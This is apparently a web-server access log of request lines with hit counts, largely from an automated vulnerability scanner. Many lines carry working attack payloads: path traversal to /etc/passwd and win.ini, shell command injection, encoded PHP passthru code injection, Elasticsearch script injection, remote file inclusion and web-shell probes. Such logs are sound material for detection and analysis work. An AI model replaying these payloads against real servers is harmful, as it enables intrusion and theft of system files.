101771
"GET /message/list/?_random=1405734888162 HTTP/1.0"###1
"GET /webl/index.html HTTP/1.1"###1
"GET /opendir.php?/etc/passwd HTTP/1.1"###1
"GET /nuke/modules.php?name=Network_Tools&file=index&func=ping_host&hinput=%3Bid HTTP/1.1"###1
"GET /scripts/r.cgi?FILE=../../../../../../../../../../etc/passwd HTTP/1.1"###1
"GET /cgi-bin/dcforum.cgi?az=list&forum=../../../../../../../etc/passwd%00 HTTP/1.1"###1
"GET /cgi-bin/Count.cgi HTTP/1.1"###1
"GET /scripts/bb-hist.sh?HISTFILE=../../../../../etc/passwd HTTP/1.1"###1
"GET /cgi-bin/doc/html/index.html HTTP/1.1"###1
"GET /message/list/?_random=1405749162696 HTTP/1.0"###1
"GET /?Mode=debug HTTP/1.1"###1
"GET /phpmyadmin/Documentation.html HTTP/1.1"###1
"GET /cgi-bin/mrtg.cgi?cfg=../../../../../../../../etc/passwd HTTP/1.1"###1
"GET /status.php3 HTTP/1.1"###1
"GET /samples/quickstart/docs/index.html HTTP/1.1"###1
"GET /user/getuser?_random=1405746691890 HTTP/1.0"###1
"GET /scripts/auktion.cgi?menue=../../../../../../../../../etc/passwd HTTP/1.1"###1
"GET /message/list/?_random=1405755260025 HTTP/1.0"###1
"GET /cgi-bin/htgrep/file=index.html&hdr=/etc/passwd HTTP/1.1"###1
"GET /scripts/loadpage.cgi?user_id=1&file=..\..\..\..\..\..\..\..\winnt\win.ini HTTP/1.1"###1
"GET /https-admserv/bin/index HTTP/1.1"###1
"GET /message/list/?_random=1405704132250 HTTP/1.0"###1
"GET /message/list/?_random=1405734898467 HTTP/1.0"###1
"GET /scripts/story.pl?next=../../../../../etc/passwd%00 HTTP/1.1"###1
"GET /scripts/Documentation.html HTTP/1.1"###1
"GET /message/list/?_random=1405734907100 HTTP/1.0"###1
"GET /message/list/?_random=1405734873101 HTTP/1.0"###1
"POST /xoda-0.4.4/?upload HTTP/1.1"###1
"GET /message/list/?_random=1405760251728 HTTP/1.0"###1
"GET /scripts/way-board/way-board.cgi?db=/etc/passwd%00 HTTP/1.1"###1
"GET /scripts/common.php?f=0&ForumLang=../../../../../../../etc/passwd HTTP/1.1"###1
"GET /scripts/YaBB.pl?board=news&action=display&num=../../../../../../etc/passwd%00 HTTP/1.1"###1
"GET /cgi-bin/awstatstotals.php?sort=%7b%24%7bpassthru(chr(99).chr(97).chr(116).chr(32).chr(47).chr(101).chr(116).chr(99).chr(47).chr(112).chr(97).chr(115).chr(115).chr(119).chr(100))%7d%7d%7b%24%7bexit()%7d%7d HTTP/1.1"###1
"GET /scripts/sql.php?server=000&cfgServers[000][host]=hello&btnDrop=No&goto=/etc/passwd HTTP/1.1"###1
"GET /.FBCIndex HTTP/1.1"###1
"GET /message/list/?_random=1405761563742 HTTP/1.0"###1
"GET /php/modules.php?set_albumName=album01&id=aaw&op=modload&name=gallery&file=index&include=../../../../../../etc/passwd HTTP/1.1"###1
"GET /nuke50/modules.php?name=Network_Tools&file=index&func=ping_host&hinput=%3Bid HTTP/1.1"###1
"GET /message/list/?_random=1405725447082 HTTP/1.0"###1
"GET /xsql/demo/adhocsql/query.xsql?sql=select%20username%20from%20ALL_USERS HTTP/1.1"###1
"GET /cgi-bindirectory.php?dir=%3Bcat%20/etc/passwd HTTP/1.1"###1
"GET /message/list/?_random=1405760256894 HTTP/1.0"###1
"GET /message/list/?_random=1405746709636 HTTP/1.0"###1
"GET /cgi-bin/ash HTTP/1.1"###1
"POST /narcissus-master/backend.php HTTP/1.1"###1
"GET /phprocketaddin/?page=../../../../../../../../../../../../../../../etc/passwd HTTP/1.1"###1
"GET /demo/admin.php?upload=1&file=config.php&file_name=RSAS.txt&wdir=/images/&userfile=config.php&userfile_name=RSAS.txt HTTP/1.1"###1
"GET /message/list/?_random=1405725466249 HTTP/1.0"###1
"GET /RsasTest997135353.html HTTP/1.1"###1
"GET /cgi-bin/webplus?about HTTP/1.1"###1
"GET /zauroscantestn123321d.html HTTP/1.1"###1
"GET /scripts/doc/html/index.html HTTP/1.1"###1
"GET /cgi-bin/story/story.pl?next=../../../../../etc/passwd%00 HTTP/1.1"###1
"GET /users.php HTTP/1.1"###1
"POST /xoda/?upload HTTP/1.1"###1
"GET /cfanywhere/index.html HTTP/1.1"###1
"GET /message/list/?_random=1405730789435 HTTP/1.0"###1
"GET /geeklog/public_html/users.php HTTP/1.1"###1
"GET /userfiles/file/8g3L7avk(1).asp HTTP/1.1"###1
"GET /pages/bb_smilies.php?user=MToxOjE6MToxOjE6MToxOjE6Li4vLi4vLi4vLi4vLi4vZXRjL3Bhc3N3ZAAK HTTP/1.1"###1
"GET /message/list/?_random=1405755257641 HTTP/1.0"###1
"GET /cgi-bin/sql.php3?server=000&cfgServers[000][host]=hello&btnDrop=No&goto=/etc/passwd HTTP/1.1"###1
"POST /user/status/on HTTP/1.0"###4
"GET /infosrch.cgi?cmd=getdoc&db=man&fname=|/bin/id HTTP/1.1"###2
"GET /ans/ans.pl?p=../../../../../usr/bin/id|&blah HTTP/1.1"###1
"GET /message/list/?_random=1405760355610 HTTP/1.0"###1
"GET /cgi-bin/Web_Store/web_store.cgi?page=../../../../../../etc/passwd%00.html HTTP/1.1"###1
"GET /images/RSAS.txt HTTP/1.1"###10
"GET /webpagetest/gettext.php?file=../../../../../../../../../../../windows/win.ini HTTP/1.1"###1
"GET /cgi-bin/tcsh HTTP/1.1"###1
"GET /pafiledb/includes/team/file.php HTTP/1.0"###1
"GET /message/list/?_random=1405701239678 HTTP/1.0"###1
"GET /vtiger HTTP/1.1"###1
"GET /phpnuke/html/admin.php?upload=1&file=config.php&file_name=RSAS.txt&wdir=/images/&userfile=config.php&userfile_name=RSAS.txt HTTP/1.1"###1
"GET /user/getuser?_random=1405737642545 HTTP/1.0"###1
"GET /user/getuser?_random=1405705010654 HTTP/1.0"###1
"GET /phpMyAdmin/sql.php?server=000&cfgServers[000][host]=hello&btnDrop=No&goto=/etc/passwd HTTP/1.1"###1
"GET /soapdocs/webapps/soap/WEB-INF/config/soapConfig.xml HTTP/1.1"###2
"GET /cgi-bin/nonexist HTTP/1.1"###7
"POST /cgi-bin/Web_store/web_store.cgi HTTP/1.0"###1
"POST /phpBB/admin/admin_styles.php?mode=addnew HTTP/1.0"###1
"GET /php_nuke/html/admin.php?upload=1&file=config.php&file_name=RSAS.txt&wdir=/images/&userfile=config.php&userfile_name=RSAS.txt HTTP/1.1"###1
"GET /forum/bb_smilies.php?user=MToxOjE6MToxOjE6MToxOjE6Li4vLi4vLi4vLi4vLi4vZXRjL3Bhc3N3ZAAK HTTP/1.1"###1
"POST /bin/view HTTP/1.0"###1
"GET /scripts/mrtg.cgi?cfg=../../../../../../../../etc/passwd HTTP/1.1"###1
"GET / HTTP/1.1"###30
"POST /havalite/havalite/upload.php HTTP/1.0"###1
"GET /invoker/JMXInvokerServlet HTTP/1.1"###1
"GET /cgi-bin/apexec.pl?etype=odp&template=../../../../../../../../../etc/passwd%00.html&passurl=/category/ HTTP/1.1"###1
"GET /message/list/?_random=1405746305396 HTTP/1.0"###1
"GET /RsasTest1498824128.html HTTP/1.1"###1
"GET /user/getuser?_random=1405733578324 HTTP/1.0"###1
"GET /cgi-bin/index.php?chemin=..%2F..%2F..%2F..%2F..%2F..%2F..%2F%2Fetc HTTP/1.1"###1
"GET /cgi-bin/r.cgi?FILE=../../../../../../../../../../etc/passwd HTTP/1.1"###1
"GET /cgi-bin/awstats.pl?configdir=%7Ccat%20/etc/passwd;\n%7C HTTP/1.0"###1
"GET /%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd HTTP/1.1"###1
"GET /message/list/?_random=1405760418112 HTTP/1.0"###1
"GET /login.action HTTP/1.1"###1
"GET /user/getuser?_random=1405750997111 HTTP/1.0"###1
"GET /message/list/?_random=1405746636151 HTTP/1.0"###1
"GET /phpinfo.php HTTP/1.1"###1
"GET /stat/awstatstotals.php?sort=%7b%24%7bpassthru(chr(100).chr(105).chr(114).chr(32).chr(47).chr(65).chr(58).chr(72).chr(32).chr(99).chr(58))%7d%7d%7b%24%7bexit()%7d%7d HTTP/1.1"###1
"GET /cgi-bin/com5.pl HTTP/1.1"###1
"GET /scripts/sh HTTP/1.1"###1
"GET /message/list/?_random=1405760683010 HTTP/1.0"###1
"GET /scripts/index.js0x70 HTTP/1.1"###1
"GET /message/list/?_random=1405705013352 HTTP/1.0"###1
"GET /message/list/?_random=1405760321644 HTTP/1.0"###1
"GET /Album/?mode=album&album=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc&dispsize=640&start=0 HTTP/1.1"###1
"GET /%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/boot.ini HTTP/1.1"###1
"POST /WANem/result.php HTTP/1.1"###1
"GET /phpmyadmin/ HTTP/1.1"###1
"GET /vtigercrm HTTP/1.1"###1
"GET /scripts/htsearch?-c/nonexistent HTTP/1.1"###1
"GET /cgi-bin/cgicso?query=AAA HTTP/1.1"###1
"GET /scripts/store.cgi?StartID=../../../../../../../../../etc/passwd%00.html HTTP/1.1"###1
"GET /awstatstotals.php?sort=%7b%24%7bpassthru(chr(100).chr(105).chr(114).chr(32).chr(47).chr(65).chr(58).chr(72).chr(32).chr(99).chr(58))%7d%7d%7b%24%7bexit()%7d%7d HTTP/1.1"###1
"GET /cgi-bin/loadpage.cgi?user_id=1&file=..\..\..\..\..\..\..\..\winnt\win.ini HTTP/1.1"###1
"GET /scripts/htsearch?exclude=%60/etc/passwd%60 HTTP/1.1"###1
"GET /Documentation.html HTTP/1.1"###1
"GET /message/list/?_random=1405734889352 HTTP/1.0"###1
"GET /user/getuser?_random=1405736524547 HTTP/1.0"###1
"GET /message/list/?_random=1405780592582 HTTP/1.0"###1
"GET //sql.php3?LIB_INC=1&btnDrop=No&goto=/etc/passwd HTTP/1.1"###1
"GET /PSUser/PSCOErrPage.htm?errPagePath=/etc/passwd HTTP/1.1"###1
"GET /CFIDE/componentutils/cfcexplorer.cfc?method=getcfcinhtml&name=CFIDE.adminapi.administrator&path=../../../../license.html HTTP/1.1"###1
"GET /_search?source=%7b%22size%22%3a1%2c%22query%22%3a%7b%22filtered%22%3a%7b%22query%22%3a%7b%22match_all%22%3a%7b%7d%7d%7d%7d%2c%22script_fields%22%3a%7b%22b9b7dd1c421e005bc9a7f70b848e3d0e%22%3a%7b%22script%22%3a%22import+java.util.*%3b%5cnimport+java.io.*%3b%5cna%3d%5c%221%5c%22%3b%5cnif(a%3d%3d%5c%221%5c%22)%5cnreturn+%5c%22098f6bcd4621d373cade4e832627b4f6%5c%22%3b%22%7d%7d%7d&callback=jQuery111106033293346081683_1400563833509&_=1400563833510 HTTP/1.1"###1
"GET /stat/awstatstotals.php?sort=%7b%24%7bpassthru(chr(99).chr(97).chr(116).chr(32).chr(47).chr(101).chr(116).chr(99).chr(47).chr(112).chr(97).chr(115).chr(115).chr(119).chr(100))%7d%7d%7b%24%7bexit()%7d%7d HTTP/1.1"###1
"GET /scripts/nx/common/cds/menu.inc.php?c_path=http://xxxxxxxx/ HTTP/1.1"###1
"GET /SilverStream HTTP/1.1"###1
"RSAS / HTTP/1.0"###1
"GET /cgi-bin/ksh HTTP/1.1"###1
"GET /modules.php?name=Network_Tools&file=index&func=ping_host&hinput=%3Bid HTTP/1.1"###1
"POST /hpmpa/jobAcct/Default.asp?userId=06&jobId=60 HTTP/1.1"###1
"GET /scripts/story.pl?next=about HTTP/1.1"###1
"GET /message/list/?_random=1405758102607 HTTP/1.0"###1
"GET /story.pl?next=about HTTP/1.1"###1
"GET /nx/common/cds/menu.inc.php?c_path=http://xxxxxxxx/ HTTP/1.1"###1
"GET /nuke/modules.php?set_albumName=album01&id=aaw&op=modload&name=gallery&file=index&include=../../../../../../etc/passwd HTTP/1.1"###1
"GET /stronghold-info HTTP/1.1"###1
"GET /message/list/?_random=1405737704880 HTTP/1.0"###1
"GET /cgi-local/shop.pl/page=;cat%20shop.pl| HTTP/1.1"###1
"GET /phpnew/modules.php?set_albumName=album01&id=aaw&op=modload&name=gallery&file=index&include=../../../../../../etc/passwd HTTP/1.1"###1
"GET /demo/ojspext/events/globals.jsa HTTP/1.1"###1
"GET /cgi-bin/way-board/way-board.cgi?db=/etc/passwd%00 HTTP/1.1"###1
"GET /message/list/?_random=1405746314170 HTTP/1.0"###1
"GET /message/list/?_random=1405737305057 HTTP/1.0"###1
"GET /message/list/?_random=1405749369050 HTTP/1.0"###1
"GET /sql.php3?LIB_INC=1&btnDrop=No&goto=/etc/passwd HTTP/1.1"###1
"GET /scripts/loadpage.cgi?user_id=1&file=../../../../../../etc/passwd HTTP/1.1"###1
"GET /user/getuser?_random=1405704117154 HTTP/1.0"###1
"GET /message/list/?_random=1405755238993 HTTP/1.0"###1
"GET /servlet/admin?category=server&method=listAll&Authorization=Digest+username%3D%22admin%22%2C+response%3D%22ae9f86d6beaa3f9ecb9a5b7e072a4138%22%2C+nonce%3D%222b089ba7985a883ab2eddcd3539a6c94%22%2C+realm%3D%22adminRealm%22%2C+uri%3D%22%2Fservlet%2Fadmin%22&service= HTTP/1.0"###1
"GET /scripts/bb-hostsvc.sh?HOSTSVC=../../../../../etc/passwd HTTP/1.1"###1
"GET /soapdocs/docs/apiDocs/org.apache.soap.util.xml.XMISerializer.html HTTP/1.1"###1
"GET /servlet/org.apache.catalina.servlets.DefaultServlet/default.jsp HTTP/1.1"###1
"GET /cgi-bin/YaBB.pl?board=news&action=display&num=../../../../../../etc/passwd%00 HTTP/1.1"###1
"GET /message/list/?_random=1405750997449 HTTP/1.0"###1
"GET /message/list/?_random=1405760502732 HTTP/1.0"###1
"GET /CVS/Entries HTTP/1.1"###1
"GET /message/list/?_random=1405760282261 HTTP/1.0"###1
"GET /geeklog/users.php HTTP/1.1"###1
"GET /message/list/?_random=1405763374319 HTTP/1.0"###1
"GET /servlet/oracle.xml.xsql.XSQLServlet/xsql/lib/XSQLConfig.xml HTTP/1.1"###1
"GET /message/list/?_random=1405746644012 HTTP/1.0"###1
"GET /message/list/?_random=1405725468435 HTTP/1.0"###1
"GET /index.cfm?Mode=debug HTTP/1.1"###1
"GET /user/getuser?_random=1405749358803 HTTP/1.0"###1
"GET /scripts/opendir.php?/etc/passwd HTTP/1.1"###1
"GET /phpBB2/viewtopic.php HTTP/1.0"###1
"GET /user/getuser?_random=1405769115349 HTTP/1.0"###1
"GET /nuke50/admin.php?upload=1&file=config.php&file_name=RSAS.txt&wdir=/images/&userfile=config.php&userfile_name=RSAS.txt HTTP/1.1"###1
"GET /message/list/?_random=1405734901074 HTTP/1.0"###1
"GET /scripts/csh HTTP/1.1"###1
"GET /scripts/ans/ans.pl?p=../../../../../usr/bin/id|&blah HTTP/1.1"###1
"GET /apache2-default/awstatstotals.php?sort=%7b%24%7bpassthru(chr(99).chr(97).chr(116).chr(32).chr(47).chr(101).chr(116).chr(99).chr(47).chr(112).chr(97).chr(115).chr(115).chr(119).chr(100))%7d%7d%7b%24%7bexit()%7d%7d HTTP/1.1"###1
"GET /phpMyAdmin/doc/html/index.html HTTP/1.1"###1
"GET /sql.php3?server=000&cfgServers[000][host]=hello&btnDrop=No&goto=/etc/passwd HTTP/1.1"###1
"GET /message/list/?_random=1405760500832 HTTP/1.0"###1
"GET /remotehtmlview.php?phpAds_path=http://xxxxxxxx HTTP/1.1"###1
"GET /RsasTest1521114911.html HTTP/1.1"###1
"GET /phpMyAdmin/Documentation.html HTTP/1.1"###1
"GET /admin/contextAdmin/contextAdmin.html HTTP/1.1"###1
"GET /cgi-bin/story/story.pl?next=about HTTP/1.1"###1
"GET /message/list/?_random=1405749362397 HTTP/1.0"###1
"GET /phpmyadmin/doc/html/index.html HTTP/1.1"###1
"GET /message/list/?_random=1405737642797 HTTP/1.0"###1
"GET /user/getuser?_random=1405761550441 HTTP/1.0"###1
"POST /news/ashnews.php HTTP/1.0"###1
"GET /cgi/cgiemail/cgicso?query=AAA HTTP/1.1"###1
"GET /cgi-bin/calendar/calendar_admin.pl?config=|cat%20/etc/passwd| HTTP/1.1"###1
"GET /user/getuser?_random=1405780581362 HTTP/1.0"###1
"GET //sql.php?LIB_INC=1&btnDrop=No&goto=/etc/passwd HTTP/1.1"###1
"GET /bin/cgicso?query=AAA HTTP/1.1"###1
"GET /message/list/?_random=1405705011010 HTTP/1.0"###1
"GET /.DS_Store HTTP/1.1"###1
"GET /message/list/?_random=1405760505915 HTTP/1.0"###1
"GET /user/getuser?_random=1405734872754 HTTP/1.0"###1
"GET /webpagetest/gettext.php?file=../../../../../../../../../../../etc/passwd HTTP/1.1"###1
"GET /story/story.pl?next=about HTTP/1.1"###1
"GET /havalite/havalite/tmp/files/sh.php HTTP/1.1"###1
"GET /user/getuser?_random=1405746304892 HTTP/1.0"###1
"GET /user/getuser?_random=1405737243736 HTTP/1.0"###1
"GET /message/list/?_random=1405760684758 HTTP/1.0"###1
"GET /horde/imp/status.php3 HTTP/1.1"###1
"GET /doc/html/index.html HTTP/1.1"###1
"GET /message/list/?_random=1405730786369 HTTP/1.0"###1
"GET /message/list/?_random=1405733583073 HTTP/1.0"###1
"GET /index.html HTTP/1.1"###1
"GET /message/list/?_random=1405780511971 HTTP/1.0"###1
"GET /DVR.cfg HTTP/1.1"###1
"GET /message/list/?_random=1405704119270 HTTP/1.0"###1
"GET /struts2-blank/example/HelloWorld.action?redirect:http://www.baidu.com/ HTTP/1.1"###1
"GET /phptax/drawimage.php?pfilez=xxx;%20touch%20nsfocusa6b550;&pdf=make HTTP/1.1"###1
"GET /message/list/?_random=1405761562796 HTTP/1.0"###1
"GET /cgi-bin/bb_smilies.php?user=MToxOjE6MToxOjE6MToxOjE6Li4vLi4vLi4vLi4vLi4vZXRjL3Bhc3N3ZAAK HTTP/1.1"###1
"GET /index.cfml?Mode=debug HTTP/1.1"###1
"GET /%3f.jsp HTTP/1.1"###1
"GET /message/list/?_random=1405746313011 HTTP/1.0"###1
"GET /phprocketaddin/?page=../../../../../../../../../../../../../../../WINNT/system32/ipconfig.exe HTTP/1.1"###1
"GET /phptax/nsfocusa6b550 HTTP/1.1"###2
"GET /phpMyAdmin/sql.php3?server=000&cfgServers[000][host]=hello&btnDrop=No&goto=/etc/passwd HTTP/1.1"###1
"GET /RsasTest1393062806.html HTTP/1.1"###1
"GET /message/list/?_random=1405737298326 HTTP/1.0"###1
"GET /message/list/?_random=1405760507832 HTTP/1.0"###1
"GET /nuke60/ HTTP/1.1"###1
"GET /nuke50/modules.php?set_albumName=album01&id=aaw&op=modload&name=gallery&file=index&include=../../../../../../etc/passwd HTTP/1.1"###3
"GET /cgi-bin/shop.pl/page=;cat%20shop.pl| HTTP/1.1"###1
"GET /servlet/org.apache.catalina.servlets.DefaultServlet/index.jsp HTTP/1.1"###1
"GET /message/list/?_random=1405780581769 HTTP/1.0"###1
"GET /message/list/?_random=1405734936257 HTTP/1.0"###1
"GET /IoMgmt/Adapters/wifi0/WPS/Pin HTTP/1.1"###1
"GET /SilverStream/Meta/Tables/?access-mode=text HTTP/1.1"###1
"GET /message/list/?_random=1405780043657 HTTP/1.0"###1
"GET /phpBB/index.php HTTP/1.0"###1
"GET /scripts/calendar_admin.pl?config=|cat%20/etc/passwd| HTTP/1.1"###1
"GET /scripts/search/search.cgi?keys=*&prc=any&catigory=../../../../../../../../../../../../etc HTTP/1.1"###1
"GET /awstatstotals.php?sort=%7b%24%7bpassthru(chr(99).chr(97).chr(116).chr(32).chr(47).chr(101).chr(116).chr(99).chr(47).chr(112).chr(97).chr(115).chr(115).chr(119).chr(100))%7d%7d%7b%24%7bexit()%7d%7d HTTP/1.1"###1
"GET /manager/html HTTP/1.1"###16
"GET /message/list/?_random=1405734895094 HTTP/1.0"###1
"GET /php/modules.php?name=Network_Tools&file=index&func=ping_host&hinput=%3Bid HTTP/1.1"###1
"GET /phpnuke/html/ HTTP/1.1"###1
"GET /message/list/?_random=1405737248759 HTTP/1.0"###1
"GET /modules.php?set_albumName=album01&id=aaw&op=modload&name=gallery&file=index&include=../../../../../../etc/passwd HTTP/1.1"###1
"GET /message/list/?_random=1405763375691 HTTP/1.0"###1
"POST /openemr/library/openflashchart/php-ofc-library/ofc_upload_image.php?name=smallsmallbird.php HTTP/1.1"###1
"GET /pma/Documentation.html HTTP/1.1"###1
"GET /message/list/?_random=1405780985188 HTTP/1.0"###1
"GET /docs/servlets/index.html HTTP/1.1"###1
"GET /cgi-bin/opendir.php?/etc/passwd HTTP/1.1"###1
"GET /cgi-bin/swc?ctr=XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX HTTP/1.1"###1
"GET /message/list/?_random=1405746647413 HTTP/1.0"###1
"GET /user/getuser?_random=1405758102197 HTTP/1.0"###1
"GET /message/list/?_random=1405746310658 HTTP/1.0"###1
"GET /awstatstotals/awstatstotals.php?sort=%7b%24%7bpassthru(chr(100).chr(105).chr(114).chr(32).chr(47).chr(65).chr(58).chr(72).chr(32).chr(99).chr(58))%7d%7d%7b%24%7bexit()%7d%7d HTTP/1.1"###1
"GET /scripts/htgrep/file=index.html&hdr=/etc/passwd HTTP/1.1"###1
"GET /site/eg/source.asp HTTP/1.1"###1
"GET /message/list/?_random=1405734909943 HTTP/1.0"###1
"GET /message/list/?_random=1405758104795 HTTP/1.0"###1
"GET /message/list/?_random=1405760504331 HTTP/1.0"###1
"GET /message/list/?_random=1405734927842 HTTP/1.0"###1
"GET /WikiSandBox HTTP/1.1"###1
"GET /phpPgAdmin/sql.php?LIB_INC=1&btnDrop=No&goto=/etc/passwd HTTP/1.1"###1
"GET /message/list/?_random=1405730792662 HTTP/1.0"###1
"GET /message/list/?_random=1405746308291 HTTP/1.0"###1
"GET /aaaaaaaaaaaaa.html HTTP/1.1"###1
"GET /cgi-bin/test-cgi?/* HTTP/1.1"###1
"GET /message/list/?_random=1405779753364 HTTP/1.0"###1
"GET /message/list/?_random=1405748994984 HTTP/1.0"###1
"GET /index.php HTTP/1.1"###3
"GET / HTTP/1.0"###6
"POST / HTTP/1.0"###2
"GET /scripts/modules.php?name=Network_Tools&file=index&func=ping_host&hinput=%3Bid HTTP/1.1"###1
"GET /cgi-bin/remotehtmlview.php?phpAds_path=http://xxxxxxxx HTTP/1.1"###1
"GET /mediawiki/index.php?title=Special%3aUserLogin&returnto=Main%2bPage HTTP/1.1"###1
"GET /scripts/zml.cgi?file=../../../../../../../../../../../../etc/passwd%00 HTTP/1.1"###1
"GET /userLogin.asp HTTP/1.0"###1
"GET /php/admin.php?upload=1&file=config.php&file_name=RSAS.txt&wdir=/images/&userfile=config.php&userfile_name=RSAS.txt HTTP/1.1"###1
"GET /imp/status.php3 HTTP/1.1"###1
"GET /scripts/index.php?chemin=..%2F..%2F..%2F..%2F..%2F..%2F..%2F%2Fetc HTTP/1.1"###1
"GET /message/list/?_random=1405780516923 HTTP/1.0"###1
"GET /DB4Web/www.microsoft.com:23/foo HTTP/1.1"###1
"GET /scripts/cvsweb.cgi HTTP/1.1"###1
"GET /cgi-bin/commerce.cgi?page=../../../../../etc/passwd%00index.html HTTP/1.1"###1
"GET /message/list/?_random=1405737303035 HTTP/1.0"###1
"GET /geeklog-1.3.5sr2/public_html/users.php HTTP/1.1"###1
"GET /mediawiki-1.19.4/index.php?title=Special%3aUserLogin&returnto=Main%2bPage HTTP/1.1"###1
"GET /soap/servlet/soaprouter HTTP/1.1"###1
"GET /cgi-bin/Documentation.html HTTP/1.1"###1
"GET /search?NS-query-pat=../../../../../../../../../etc/passwd HTTP/1.1"###1
"GET /html/cgi-bin/cgicso?query=AAA HTTP/1.1"###1
"GET /weblog/public_html/users.php HTTP/1.1"###1
"GET /scripts/webplus?about HTTP/1.1"###1
"GET /cgi-bin/story.pl?next=../../../../../etc/passwd%00 HTTP/1.1"###1
"GET /mediawiki-1.20.3/index.php?title=Special%3aUserLogin&returnto=Main%2bPage HTTP/1.1"###1
"GET /cgi-bin/support/common.php?f=0&ForumLang=../../../../../../../etc/passwd HTTP/1.1"###1
"GET /message/list/?_random=1405701272308 HTTP/1.0"###1
"GET /bbs/viewtopic.php HTTP/1.0"###1
"GET /user/getuser?_random=1405730786256 HTTP/1.0"###1
"GET /cgi-bin/calendar_admin.pl?config=|cat%20/etc/passwd| HTTP/1.1"###1
"GET /digi-news/admin.php?action=config HTTP/1.0"###1
"GET /phptax/drawimage.php?pfilez=xxx;%20rm%20nsfocusa6b550;&pdf=make HTTP/1.1"###1
"GET /RsasTest1465784461.html HTTP/1.1"###1
"GET /cgi-bin/bb-hist.sh?HISTFILE=../../../../../etc/passwd HTTP/1.1"###1
"GET /message/list/?_random=1405769115539 HTTP/1.0"###1
"GET /nuke65/ HTTP/1.1"###1
"GET /cgi-bin/shopper.cgi?newpage=../../../../../../etc/passwd HTTP/1.1"###1
"GET /usage/ HTTP/1.1"###1
"GET /user/getuser?_random=1405780016049 HTTP/1.0"###1
"GET /apache2-default/awstatstotals.php?sort=%7b%24%7bpassthru(chr(100).chr(105).chr(114).chr(32).chr(47).chr(65).chr(58).chr(72).chr(32).chr(99).chr(58))%7d%7d%7b%24%7bexit()%7d%7d HTTP/1.1"###1
"GET /cgi-bin/hsx.cgi?show=../../../../../../../../../../../../../etc/passwd%00 HTTP/1.1"###1
"GET /message/list/?_random=1405725474710 HTTP/1.0"###1
"GET /default.cfm?Mode=debug HTTP/1.1"###1
"GET /cgi-bin/zsh HTTP/1.1"###1
"GET /message/list/?_random=1405760248361 HTTP/1.0"###1
"GET /cgi-bin/zml.cgi?file=../../../../../../../../../../../../etc/passwd%00 HTTP/1.1"###1
"GET /./WEB-INF/ HTTP/1.1"###1
"GET /message/list/?_random=1405737306623 HTTP/1.0"###1
"GET /pages/awstatstotals.php?sort=%7b%24%7bpassthru(chr(99).chr(97).chr(116).chr(32).chr(47).chr(101).chr(116).chr(99).chr(47).chr(112).chr(97).chr(115).chr(115).chr(119).chr(100))%7d%7d%7b%24%7bexit()%7d%7d HTTP/1.1"###1
"GET /message/list/?_random=1405760349411 HTTP/1.0"###1
"GET /phpnuke/html/modules.php?set_albumName=album01&id=aaw&op=modload&name=gallery&file=index&include=../../../../../../etc/passwd HTTP/1.1"###1
"GET /pls/sample/admin_/ HTTP/1.1"###1
"GET /cgi-bin/edit_image.php?dn=1&userfile=/etc/passwd&userfile_name=%20;id;%20 HTTP/1.1"###1
"GET /cgi-bin/story.pl?next=about HTTP/1.1"###1
"GET /scripts/ustorekeeper.pl?command=goto&file=../../../../../../../../../../etc/passwd HTTP/1.1"###1
"POST /shoutbox/shoutbox.php HTTP/1.1"###1
"GET /webpagetest/www/gettext.php?file=../../../../../../../../../../../windows/win.ini HTTP/1.1"###1
"GET /WEB-INF./web.xml HTTP/1.1"###1
"GET /phpnew/modules.php?name=Network_Tools&file=index&func=ping_host&hinput=%3Bid HTTP/1.1"###1
"POST /order/53c87b9ac60ab0dc6a79a979/closesession HTTP/1.0"###1
"GET /message/list/?_random=1405751000563 HTTP/1.0"###1
"GET /whatsnew.txt HTTP/1.1"###1
"GET /message/list/?_random=1405733582779 HTTP/1.0"###1
"GET /dev/save_restore.xml HTTP/1.1"###1
"GET /nuke50/ HTTP/1.1"###1
"GET /cgi-bin/ustorekeeper.pl?command=goto&file=../../../../../../../../../../etc/passwd HTTP/1.1"###1
"GET /cgi-bin/bb-hostsvc.sh?HOSTSVC=../../../../../etc/passwd HTTP/1.1"###1
"GET /message/list/?_random=1405759501806 HTTP/1.0"###1
"GET /cgi-bin/Aurora-2016238455.html HTTP/1.1"###1
"GET /servlet/org.apache.catalina.servlets.DefaultServlet/scripts/ HTTP/1.1"###1
"GET /cgi-bin/htsearch?config=foofighter&restrict=&exclude=&method=and&format=builtin-long&sort=score&words= HTTP/1.1"###1
"GET /scripts/apexec.pl?etype=odp&template=../../../../../../../../../etc/passwd%00.html&passurl=/category/ HTTP/1.1"###1
